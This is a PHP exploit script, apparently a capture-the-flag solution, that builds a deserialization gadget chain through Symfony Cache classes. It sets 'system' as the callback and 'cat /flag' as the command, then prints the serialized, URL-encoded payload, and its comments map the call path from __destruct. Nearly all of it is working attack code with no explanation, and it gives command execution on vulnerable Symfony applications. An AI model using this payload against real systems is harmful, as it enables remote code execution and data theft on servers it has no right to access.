<?php

namespace Symfony\Component\Cache\Adapter;

class TagAwareAdapter{
    public $deferred = array();
    function __construct($x){
        $this->pool = $x;
    }
}

class ProxyAdapter{
    protected $setInnerItem = 'system';
}

namespace Symfony\Component\Cache;

class CacheItem{
    protected $innerItem = 'cat /flag';
}

$a = new \Symfony\Component\Cache\Adapter\TagAwareAdapter(new \Symfony\Component\Cache\Adapter\ProxyAdapter());
$a->deferred = array('aa'=>new \Symfony\Component\Cache\CacheItem);
echo urlencode(serialize($a));

//TagAwareAdapter.php->__destruct()->commit()->invalidateTags(array $tags)->$this->pool->saveDeferred($item)
//
//PhpArrayAdapter.php->saveDeferred(CacheItemInterface $item)->initialize()
//
//PhpArrayTrait.php->initialize()
